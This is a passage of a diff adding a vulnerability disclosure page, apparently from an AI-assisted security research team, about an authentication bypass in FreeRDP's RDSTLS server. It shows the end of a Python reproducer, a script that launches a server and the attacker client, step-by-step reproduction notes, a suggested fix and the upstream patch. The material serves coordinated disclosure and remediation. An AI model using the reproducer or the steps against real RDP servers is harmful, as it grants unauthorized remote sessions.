+    print(&quot;  positive (correct credential)  -&gt; %-14s  expect SUCCESS&quot; % cell(pos), flush=True)
+    print(&quot;  negative (wrong credential)    -&gt; %-14s  expect ACCESS_DENIED&quot; % cell(neg), flush=True)
+    print(&quot;  ATTACK   (no credential)       -&gt; %-14s  expect (secure) rejection&quot; % cell(atk), flush=True)
+    print(&quot;=&quot; * 72, flush=True)
+
+    auth_enforced = (pos == RDSTLS_RESULT_SUCCESS and neg == RDSTLS_RESULT_ACCESS_DENIED)
+    bypassed = (atk == RDSTLS_RESULT_SUCCESS)
+
+    if auth_enforced and bypassed:
+        print(&quot;VULNERABLE: the server REJECTS a wrong RedirectionGuid (ACCESS_DENIED) but&quot;, flush=True)
+        print(&quot;            ACCEPTS a credential-less Capabilities PDU as SUCCESS.&quot;, flush=True)
+        print(&quot;            Real RDSTLS authentication is bypassed via PDU-type confusion.&quot;, flush=True)
+        print(&quot;REPRO_OK&quot;, flush=True)
+        return 0
+
+    if not auth_enforced:
+        print(&quot;[!] auth not enforced as expected (positive=%s negative=%s) -&gt; inconclusive&quot;
+              % (cell(pos), cell(neg)), flush=True)
+    if not bypassed:
+        print(&quot;[*] attack did NOT bypass (attack=%s) -&gt; looks fixed/rejected&quot; % cell(atk), flush=True)
+    print(&quot;REPRO_FAIL&quot;, flush=True)
+    return 1
+
+
+if __name__ == &quot;__main__&quot;:
+    try:
+        rc = main()
+    except Exception as e:  # noqa
+        print(&quot;[!] trigger error: %r&quot; % e, flush=True)
+        rc = 3
+    print(&quot;TRIGGER_EXIT=%d&quot; % rc, flush=True)
+    sys.exit(rc)
+</code></pre>
+<h4><code>run.sh</code></h4>
+<pre tabindex="0"><code class="language-sh">#!/bin/sh
+# Start the FreeRDP sample server (RDSTLS enabled) and fire the attacker client.
+set -e
+cd /opt/server
+
+# Self-signed cert/key for the server's TLS.
+if [ ! -f server.crt ]; then
+    openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt \
+        -days 3650 -nodes -subj &quot;/CN=tfreerdp&quot; &gt;/dev/null 2&gt;&amp;1
+fi
+
+echo &quot;===== starting tfreerdp-server (RdstlsSecurity=TRUE) =====&quot;
+/opt/build/server/Sample/sfreerdp-server --port=3389 --cert=server.crt --key=server.key \
+    &gt; /tmp/server.log 2&gt;&amp;1 &amp;
+SRV=$!
+
+# wait for the listener
+for i in $(seq 1 30); do
+    if python3 -c &quot;import socket,sys; s=socket.socket(); s.settimeout(1); sys.exit(0 if s.connect_ex(('127.0.0.1',3389))==0 else 1)&quot; 2&gt;/dev/null; then
+        break
+    fi
+    sleep 0.5
+done
+
+echo &quot;===== firing attacker client =====&quot;
+python3 /opt/trigger.py
+RC=$?
+
+echo
+echo &quot;===== server log (tail) =====&quot;
+tail -n 40 /tmp/server.log || true
+
+kill $SRV 2&gt;/dev/null || true
+echo &quot;EXIT=$RC&quot;
+</code></pre>
+<h2>Suggested fix</h2>
+<p>Reject any PDU other than <code>RDSTLS_TYPE_AUTHREQ</code> when the server is at the
+authentication step, and initialise <code>resultCode</code> to a denial value so SUCCESS is
+only reachable after an explicit credential comparison. Either change alone closes
+the bypass; both restore fail-closed behaviour.</p>
+<pre tabindex="0"><code class="language-diff">@@ rdstls_new
+     rdpRdstls* rdstls = (rdpRdstls*)calloc(1, sizeof(rdpRdstls));
+     ...
++    /* fail closed: only an explicit credential check may set SUCCESS */
++    rdstls-&gt;resultCode = RDSTLS_RESULT_ACCESS_DENIED;
+@@ rdstls_recv (before the switch)
+     const UINT16 pduType = Stream_Get_UINT16(s);
++    if (rdstls-&gt;server &amp;&amp; rdstls-&gt;state == RDSTLS_STATE_AUTH_REQ &amp;&amp;
++        pduType != RDSTLS_TYPE_AUTHREQ)
++    {
++        WLog_Print(rdstls-&gt;log, WLOG_ERROR,
++                   &quot;RDSTLS server expected AUTHREQ, got pduType 0x%04&quot; PRIx16, pduType);
++        return -1;
++    }
+     switch (pduType)
+</code></pre>
+<p>We verified this guard against the same reproducer. With the fix applied, the
+positive control still returns <code>SUCCESS</code> and the negative control still returns
+<code>ACCESS_DENIED</code> (legitimate authentication is preserved), but the attack no longer
+receives an AUTHRSP — <code>rdstls_recv</code> returns <code>-1</code>, authentication fails, and the
+connection is closed:</p>
+<pre tabindex="0"><code>  positive (correct credential)  -&gt; SUCCESS         expect SUCCESS
+  negative (wrong credential)    -&gt; ACCESS_DENIED   expect ACCESS_DENIED
+  ATTACK   (no credential)       -&gt; None            (server rejected/closed - fixed)
+</code></pre>
+<h2>Attribution</h2>
+<p>This issue was found using AI and agents, and has been reviewed manually. Please
+credit <strong>Claude</strong> and <strong>Ada Logics</strong> — found by Anthropic using agents to study
+the security of open-source projects, with Ada Logics validating and reporting.
+Let us know if you need any more information.</p>
+<h2>Disclosure</h2>
+<p>We follow coordinated disclosure policy here:
+https://www.anthropic.com/coordinated-vulnerability-disclosure (90 day deadline).</p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/libfreerdp/core/rdstls.c b/libfreerdp/core/rdstls.c</span>
+<span class="diff-h">index e076caf75116..313e9eb53a80 100644</span>
+<span class="diff-h">--- a/libfreerdp/core/rdstls.c</span>
+<span class="diff-h">+++ b/libfreerdp/core/rdstls.c</span>
+<span class="diff-h">@@ -33,8 +33,8 @@</span>
+<span class="diff-c"> #include &quot;transport.h&quot;</span>
+<span class="diff-c"> #include &quot;utils.h&quot;</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-#define RDSTLS_VERSION_1 0x01</span>
+<span class="diff-d">-#define RDSTLS_VERSION_2 0x02</span>
+<span class="diff-a">+#define RDSTLS_VERSION_1 0x01u</span>
+<span class="diff-a">+#define RDSTLS_VERSION_2 0x02u</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> #define RDSTLS_TYPE_CAPABILITIES 0x01</span>
+<span class="diff-c"> #define RDSTLS_TYPE_AUTHREQ 0x02</span>
+<span class="diff-h">@@ -77,8 +77,10 @@ struct rdp_rdstls</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	RDSTLS_RESULT_CODE resultCode;</span>
+<span class="diff-c"> 	wLog* log;</span>
+<span class="diff-a">+	uint16_t supportedVersions;</span>
+<span class="diff-c"> };</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static const char* rdstls_result_code_str(UINT32 resultCode)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	switch (resultCode)</span>
+<span class="diff-h">@@ -103,6 +105,27 @@ static const char* rdstls_result_code_str(UINT32 resultCode)</span>
+<span class="diff-c"> 			return &quot;RDSTLS_RESULT_UNKNOWN&quot;;</span>
+<span class="diff-c"> 	}</span>
+<span class="diff-c"> }</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+#define rdstls_required_role_is_server(rdstls, isServer) \</span>
+<span class="diff-a">+	rdstls_required_role_is_server_((rdstls), (isServer), __FILE__, __func__, __LINE__)</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-a">+static BOOL rdstls_required_role_is_server_(const rdpRdstls* rdstls, BOOL isServer,</span>
+<span class="diff-a">+                                            const char* file, const char* fkt, size_t line)</span>
+<span class="diff-a">+{</span>
+<span class="diff-a">+	WINPR_ASSERT(rdstls);</span>
+<span class="diff-a">+	const BOOL rc = rdstls-&gt;server == isServer;</span>
+<span class="diff-a">+	if (!rc)</span>
+<span class="diff-a">+	{</span>
+<span class="diff-a">+		const DWORD level = WLOG_ERROR;</span>
+<span class="diff-a">+		if (WLog_IsLevelActive(rdstls-&gt;log, level))</span>
+<span class="diff-a">+			WLog_PrintTextMessage(rdstls-&gt;log, level, line, file, fkt,</span>
+<span class="diff-a">+			                      &quot;Message not allowed in current role &#x27;%s&#x27;&quot;,</span>
+<span class="diff-a">+			                      rdstls-&gt;server ? &quot;server&quot; : &quot;client&quot;);</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+	return rc;</span>
+<span class="diff-a">+}</span>
+<span class="diff-a">+</span>
+<span class="diff-c"> /**</span>
+<span class="diff-c">  * Create new RDSTLS state machine.</span>
+<span class="diff-c">  *</span>
+<span class="diff-h">@@ -128,6 +151,7 @@ rdpRdstls* rdstls_new(rdpContext* context, rdpTransport* transport)</span>
+<span class="diff-c"> 	rdstls-&gt;transport = transport;</span>
+<span class="diff-c"> 	rdstls-&gt;server = settings-&gt;ServerMode;</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+	rdstls-&gt;resultCode = RDSTLS_RESULT_ACCESS_DENIED;</span>
+<span class="diff-c"> 	rdstls-&gt;state = RDSTLS_STATE_INITIAL;</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	return rdstls;</span>
+<span class="diff-h">@@ -143,6 +167,7 @@ void rdstls_free(rdpRdstls* rdstls)</span>
+<span class="diff-c"> 	free(rdstls);</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static const char* rdstls_get_state_str(RDSTLS_STATE state)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	switch (state)</span>
+<span class="diff-h">@@ -162,12 +187,14 @@ static const char* rdstls_get_state_str(RDSTLS_STATE state)</span>
+<span class="diff-c"> 	}</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static RDSTLS_STATE rdstls_get_state(rdpRdstls* rdstls)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	WINPR_ASSERT(rdstls);</span>
+<span class="diff-c"> 	return rdstls-&gt;state;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL check_transition(wLog* log, RDSTLS_STATE current, RDSTLS_STATE expected,</span>
+<span class="diff-c">                              RDSTLS_STATE requested)</span>
+<span class="diff-c"> {</span>
+<span class="diff-h">@@ -182,6 +209,7 @@ static BOOL check_transition(wLog* log, RDSTLS_STATE current, RDSTLS_STATE expec</span>
+<span class="diff-c"> 	return TRUE;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_set_state(rdpRdstls* rdstls, RDSTLS_STATE state)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	BOOL rc = FALSE;</span>
+<span class="diff-h">@@ -220,18 +248,44 @@ static BOOL rdstls_set_state(rdpRdstls* rdstls, RDSTLS_STATE state)</span>
+<span class="diff-c"> 	return rc;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+#define rdstls_check_state_requirements(rdstls, expected) \</span>
+<span class="diff-a">+	rdstls_check_state_requirements_((rdstls), (expected), __FILE__, __func__, __LINE__)</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-a">+static BOOL rdstls_check_state_requirements_(rdpRdstls* rdstls, RDSTLS_STATE expected,</span>
+<span class="diff-a">+                                             const char* file, const char* fkt, size_t line)</span>
+<span class="diff-a">+{</span>
+<span class="diff-a">+	const RDSTLS_STATE current = rdstls_get_state(rdstls);</span>
+<span class="diff-a">+	if (current == expected)</span>
+<span class="diff-a">+		return TRUE;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	WINPR_ASSERT(rdstls);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	const DWORD log_level = WLOG_ERROR;</span>
+<span class="diff-a">+	if (WLog_IsLevelActive(rdstls-&gt;log, log_level))</span>
+<span class="diff-a">+		WLog_PrintTextMessage(rdstls-&gt;log, log_level, line, file, fkt,</span>
+<span class="diff-a">+		                      &quot;Unexpected rdstls state %s [%u], expected %s [%u]&quot;,</span>
+<span class="diff-a">+		                      rdstls_get_state_str(current), current,</span>
+<span class="diff-a">+		                      rdstls_get_state_str(expected), expected);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	return FALSE;</span>
+<span class="diff-a">+}</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_write_capabilities(WINPR_ATTR_UNUSED rdpRdstls* rdstls, wStream* s)</span>
+<span class="diff-c"> {</span>
+<span class="diff-d">-	if (!Stream_EnsureRemainingCapacity(s, 6))</span>
+<span class="diff-a">+	if (!Stream_EnsureRemainingCapacity(s, 8))</span>
+<span class="diff-c"> 		return FALSE;</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+	Stream_Write_UINT16(s, rdstls-&gt;supportedVersions);</span>
+<span class="diff-c"> 	Stream_Write_UINT16(s, RDSTLS_TYPE_CAPABILITIES);</span>
+<span class="diff-c"> 	Stream_Write_UINT16(s, RDSTLS_DATA_CAPABILITIES);</span>
+<span class="diff-d">-	Stream_Write_UINT16(s, RDSTLS_VERSION_1);</span>
+<span class="diff-a">+	Stream_Write_UINT16(s, rdstls-&gt;supportedVersions);</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	return TRUE;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static SSIZE_T rdstls_write_string(wStream* s, const char* str)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	const size_t pos = Stream_GetPosition(s);</span>
+<span class="diff-h">@@ -267,6 +321,7 @@ static SSIZE_T rdstls_write_string(wStream* s, const char* str)</span>
+<span class="diff-c"> 	return (SSIZE_T)(Stream_GetPosition(s) - pos);</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_write_data(wStream* s, UINT32 length, const BYTE* data)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	WINPR_ASSERT(data || (length == 0));</span>
+<span class="diff-h">@@ -284,10 +339,12 @@ static BOOL rdstls_write_data(wStream* s, UINT32 length, const BYTE* data)</span>
+<span class="diff-c"> 	return TRUE;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_write_cookie(wStream* s, const ARC_SC_PRIVATE_PACKET* cookie)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	WINPR_ASSERT(cookie);</span>
+<span class="diff-d">-	const uint16_t length = 28;</span>
+<span class="diff-a">+	const uint16_t length = sizeof(ARC_SC_PRIVATE_PACKET);</span>
+<span class="diff-a">+	WINPR_STATIC_ASSERT(sizeof(ARC_SC_PRIVATE_PACKET) == 28);</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	if (!Stream_EnsureRemainingCapacity(s, 2))</span>
+<span class="diff-c"> 		return FALSE;</span>
+<span class="diff-h">@@ -304,11 +361,42 @@ static BOOL rdstls_write_cookie(wStream* s, const ARC_SC_PRIVATE_PACKET* cookie)</span>
+<span class="diff-c"> 	return TRUE;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-a">+static BOOL rdstls_read_cookie(wLog* log, wStream* s, ARC_SC_PRIVATE_PACKET* cookie)</span>
+<span class="diff-a">+{</span>
+<span class="diff-a">+	WINPR_ASSERT(cookie);</span>
+<span class="diff-a">+	const uint16_t length = sizeof(ARC_SC_PRIVATE_PACKET);</span>
+<span class="diff-a">+	WINPR_STATIC_ASSERT(sizeof(ARC_SC_PRIVATE_PACKET) == 28);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	if (!Stream_CheckAndLogRequiredLengthWLog(log, s, length + 2ull))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	const uint16_t len = Stream_Get_UINT16(s);</span>
+<span class="diff-a">+	if (len != length)</span>
+<span class="diff-a">+	{</span>
+<span class="diff-a">+		WLog_Print(log, WLOG_ERROR,</span>
+<span class="diff-a">+		           &quot;RDSTLS Cookie: Unexpected length %&quot; PRIu16 &quot;,  expected %&quot; PRIu16, len, length);</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	cookie-&gt;cbLen = Stream_Get_UINT32(s);</span>
+<span class="diff-a">+	cookie-&gt;version = Stream_Get_UINT32(s);</span>
+<span class="diff-a">+	cookie-&gt;logonId = Stream_Get_UINT32(s);</span>
+<span class="diff-a">+	Stream_Read(s, cookie-&gt;arcRandomBits, sizeof(cookie-&gt;arcRandomBits));</span>
+<span class="diff-a">+	return TRUE;</span>
+<span class="diff-a">+}</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_write_authentication_request_with_password(rdpRdstls* rdstls, wStream* s)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	WINPR_ASSERT(rdstls);</span>
+<span class="diff-c"> 	WINPR_ASSERT(rdstls-&gt;context);</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+	if (!rdstls_required_role_is_server(rdstls, FALSE))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_REQ))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+</span>
+<span class="diff-c"> 	WLog_Print(rdstls-&gt;log, WLOG_DEBUG, &quot;Writing RDSTLS password authentication message&quot;);</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	rdpSettings* settings = rdstls-&gt;context-&gt;settings;</span>
+<span class="diff-h">@@ -335,6 +423,7 @@ static BOOL rdstls_write_authentication_request_with_password(rdpRdstls* rdstls,</span>
+<span class="diff-c"> 	return TRUE;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_write_authentication_request_with_cookie(WINPR_ATTR_UNUSED rdpRdstls* rdstls,</span>
+<span class="diff-c">                                                             WINPR_ATTR_UNUSED wStream* s)</span>
+<span class="diff-c"> {</span>
+<span class="diff-h">@@ -343,6 +432,11 @@ static BOOL rdstls_write_authentication_request_with_cookie(WINPR_ATTR_UNUSED rd</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	WLog_Print(rdstls-&gt;log, WLOG_DEBUG, &quot;Writing RDSTLS cookie authentication message&quot;);</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+	if (!rdstls_required_role_is_server(rdstls, FALSE))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_REQ))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+</span>
+<span class="diff-c"> 	rdpSettings* settings = rdstls-&gt;context-&gt;settings;</span>
+<span class="diff-c"> 	WINPR_ASSERT(settings);</span>
+<span class="diff-c"> </span>
+<span class="diff-h">@@ -395,6 +489,11 @@ static BOOL rdstls_write_authentication_request_with_fedauth_token(rdpRdstls* rd</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	WLog_Print(rdstls-&gt;log, WLOG_DEBUG, &quot;Writing RDSTLS FedAuth token authentication message&quot;);</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+	if (!rdstls_required_role_is_server(rdstls, FALSE))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_REQ))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+</span>
+<span class="diff-c"> 	const rdpSettings* settings = rdstls-&gt;context-&gt;settings;</span>
+<span class="diff-c"> 	WINPR_ASSERT(settings);</span>
+<span class="diff-c"> </span>
+<span class="diff-h">@@ -431,9 +530,15 @@ static BOOL rdstls_write_authentication_request_with_fedauth_token(rdpRdstls* rd</span>
+<span class="diff-c"> 	return Stream_Write_UTF16_String_From_UTF8(s, wideLength, token, utf8Length, TRUE) &gt;= 0;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+WINPR_ATTR_NODISCARD</span>
+<span class="diff-c"> static BOOL rdstls_write_authentication_response(rdpRdstls* rdstls, wStream* s)</span>
+<span class="diff-c"> {</span>
+<span class="diff-c"> 	WINPR_ASSERT(rdstls);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+	if (!rdstls_required_role_is_server(rdstls, TRUE))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-a">+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_RSP))</span>
+<span class="diff-a">+		return FALSE;</span>
+<span class="diff-c"> 	if (!Stream_EnsureRemainingCapacity(s, 8))</span>
+<span class="diff-c"> 		return FALSE;</span>
+<span class="diff-c"> </span>
+<span class="diff-h">@@ -444,9 +549,41 @@ static BOOL rds</span>
+<span class="diff-c">… (truncated)</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/FreeRDP/FreeRDP/commit/b05a9510787c83c87ffc5fa8d7cc9f06ed971695" rel="noopener noreferrer">https://github.com/FreeRDP/FreeRDP/commit/b05a9510787c83c87ffc5fa8d7cc9f06ed971695</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-02</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-16</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-09-28</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">2cf7b2bd21a389dd592adf2a0d7ead11432494a6d795895b7d0ab3e05c1f8adb1418e8dc22389634c945255804aecb4e72f039893f5a6875409616092f167c2c</p>
+<p class="kicker">Committed 2026-07-22 07:29 UTC</p>
+<p class="kicker">Revealed 2026-09-28 21:58 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-TVG98XT0-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-TVG98XT0%22%2C%22bug_class%22%3A%22Authentication%20Bypass%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A43%2B00%3A00%22%2C%22description%22%3A%22In%20FreeRDP%27s%20RDSTLS%20server%20handshake%2C%20rdstls_recv%28%29%20%28rdstls.c%3A719%29%20dispatches%20solely%20on%20the%20wire%20pduType%20with%20no%20check%20of%20peer%20role%20or%20handshake%20state.%20The%20rdpRdstls%20struct%20is%20calloc-allocated%2C%20so%20resultCode%20starts%20at%200%20%3D%3D%20RDSTLS_RESULT_SUCCESS.%20A%20client%20that%20replies%20to%20the%20server%27s%20Capabilities%20PDU%20with%20another%20Capabilities%20PDU%20%28or%20an%20AUTHRSP%29%20instead%20of%20an%20Authentication%20Request%20is%20routed%20to%20a%20handler%20that%20returns%20TRUE%20without%20touching%20resultCode.%20rdstls_server_authenticate%28%29%20%28rdstls.c%3A935%29%20then%20sends%20AUTHRSP%28SUCCESS%29%20and%20returns%20authenticated%2C%20never%20evaluating%20the%20password%20or%20redirection%20GUID/cookie.%20A%20remote%20attacker%20thus%20obtains%20a%20full%20RDP%20session%20on%20any%20FreeRDP-based%20server/proxy%20with%20RdstlsSecurity%20enabled.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22libfreerdp/core/rdstls.c%3A719%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Connect%20and%20negotiate%20PROTOCOL_RDSTLS%20at%20X.224%2C%20complete%20TLS.%22%2C%222.%20Receive%20the%20server%27s%20RDSTLS%20Capabilities%20PDU.%22%2C%223.%20Reply%20with%20an%208-byte%20RDSTLS_TYPE_CAPABILITIES%20PDU%20%28version%3D1%2Ctype%3D1%2CdataType%3D1%2Cversions%3D1%29%20instead%20of%20an%20Authentication%20Request%20%28alternatively%20send%20RDSTLS_TYPE_AUTHRSP%20with%20resultCode%3D0%29.%22%2C%224.%20rdstls_recv%28%29%20routes%20it%20to%20rdstls_process_capabilities%28%29%2C%20which%20returns%20TRUE%20without%20touching%20resultCode.%22%2C%225.%20Server%20transitions%20AUTH_REQ%E2%86%92AUTH_RSP%2C%20sends%20AUTHRSP%28resultCode%3D0%3DSUCCESS%29%2C%20and%20rdstls_server_authenticate%28%29%20returns%201.%22%2C%226.%20Connection%20advances%20to%20CONNECTION_STATE_MCS_CREATE_REQUEST%20with%20the%20session%20marked%20authenticated%3B%20proceed%20with%20a%20full%20RDP%20session.%22%5D%2C%22technical_details%22%3A%22Root%20cause%20is%20a%20fail-open%20default%20combined%20with%20missing%20state%20validation%3A%20rdstls_new%28%29%20calloc-zeroes%20resultCode%20to%20RDSTLS_RESULT_SUCCESS%2C%20and%20rdstls_recv%28%29%20switches%20purely%20on%20attacker-supplied%20pduType%20without%20consulting%20rdstls-%3Estate%20or%20rdstls-%3Eserver.%20The%20state-transition%20checker%20only%20validates%20the%20server%27s%20own%20fixed%20sequence%2C%20so%20an%20unexpected%20inbound%20PDU%20type%20is%20silently%20accepted%20and%20the%20credential-verification%20path%20is%20skipped%20entirely.%22%2C%22title%22%3A%22RDSTLS%20server%20authentication%20bypass%20via%20PDU-type%20confusion%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-TVG98XT0&#34;,
+  &#34;bug_class&#34;: &#34;Authentication Bypass&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-04-16T01:52:43+00:00&#34;,
+  &#34;description&#34;: &#34;In FreeRDP&#39;s RDSTLS server handshake, rdstls_recv() (rdstls.c:719) dispatches solely on the wire pduType with no check of peer role or handshake state. The rdpRdstls struct is calloc-allocated, so resultCode starts at 0 == RDSTLS_RESULT_SUCCESS. A client that replies to the server&#39;s Capabilities PDU with another Capabilities PDU (or an AUTHRSP) instead of an Authentication Request is routed to a handler that returns TRUE without touching resultCode. rdstls_server_authenticate() (rdstls.c:935) then sends AUTHRSP(SUCCESS) and returns authenticated, never evaluating the password or redirection GUID/cookie. A remote attacker thus obtains a full RDP session on any FreeRDP-based server/proxy with RdstlsSecurity enabled.&#34;,
+  &#34;discovered_at&#34;: &#34;2026-04-02T00:00:00+00:00&#34;,
+  &#34;location&#34;: &#34;libfreerdp/core/rdstls.c:719&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;freerdp/freerdp&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Connect and negotiate PROTOCOL_RDSTLS at X.224, complete TLS.&#34;,
+    &#34;2. Receive the server&#39;s RDSTLS Capabilities PDU.&#34;,
+    &#34;3. Reply with an 8-byte RDSTLS_TYPE_CAPABILITIES PDU (version=1,type=1,dataType=1,versions=1) instead of an Authentication Request (alternatively send RDSTLS_TYPE_AUTHRSP with resultCode=0).&#34;,
+    &#34;4. rdstls_recv() routes it to rdstls_process_capabilities(), which returns TRUE without touching resultCode.&#34;,
+    &#34;5. Server transitions AUTH_REQ→AUTH_RSP, sends AUTHRSP(resultCode=0=SUCCESS), and rdstls_server_authenticate() returns 1.&#34;,
+    &#34;6. Connection advances to CONNECTION_STATE_MCS_CREATE_REQUEST with the session marked authenticated; proceed with a full RDP session.&#34;
+  ],
+  &#34;technical_details&#34;: &#34;Root cause is a fail-open default combined with missing state validation: rdstls_new() calloc-zeroes resultCode to RDSTLS_RESULT_SUCCESS, and rdstls_recv() switches purely on attacker-supplied pduType without consulting rdstls-&gt;state or rdstls-&gt;server. The state-transition checker only validates the server&#39;s own fixed sequence, so an unexpected inbound PDU type is silently accepted and the credential-verification path is skipped entirely.&#34;,
+  &#34;title&#34;: &#34;RDSTLS server authentication bypass via PDU-type confusion&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
